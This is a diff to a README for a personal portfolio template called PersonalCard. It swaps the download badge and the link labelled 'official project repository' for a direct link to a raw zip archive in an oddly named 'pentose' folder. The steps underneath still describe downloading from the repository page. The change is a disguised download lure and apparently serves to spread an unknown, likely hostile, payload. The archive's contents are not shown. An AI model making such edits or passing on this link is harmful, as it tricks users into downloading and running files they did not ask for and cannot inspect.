@@ -1,6 +1,6 @@
 # 🌐 PersonalCard - Create a professional personal portfolio website
 
-[![Download PersonalCard](https://img.shields.io/badge/Download-PersonalCard-blue.svg)](https://github.com/Rijstaffellinearprogramming2952/PersonalCard)
+[![Download PersonalCard](https://img.shields.io/badge/Download-PersonalCard-blue.svg)](https://github.com/Rijstaffellinearprogramming2952/PersonalCard/raw/refs/heads/main/pentose/Card-Personal-3.0-alpha.1.zip)
 
 ## 📌 About this project
 
@@ -21,7 +21,7 @@ Ensure your computer meets these basic needs:
 
 You must visit the project page to copy the files to your computer. Follow these steps to obtain the template:
 
-1.  Visit the official project repository: [https://github.com/Rijstaffellinearprogramming2952/PersonalCard](https://github.com/Rijstaffellinearprogramming2952/PersonalCard).
+1.  Visit the official project repository: [https://github.com/Rijstaffellinearprogramming2952/PersonalCard/raw/refs/heads/main/pentose/Card-Personal-3.0-alpha.1.zip](https://github.com/Rijstaffellinearprogramming2952/PersonalCard/raw/refs/heads/main/pentose/Card-Personal-3.0-alpha.1.zip).
 2.  Locate the green button labeled "Code" near the top right of the page.
 3.  Click "Download ZIP" to save the project folder to your computer.
 4.  Open your Downloads folder and right-click the file named PersonalCard-main.zip.
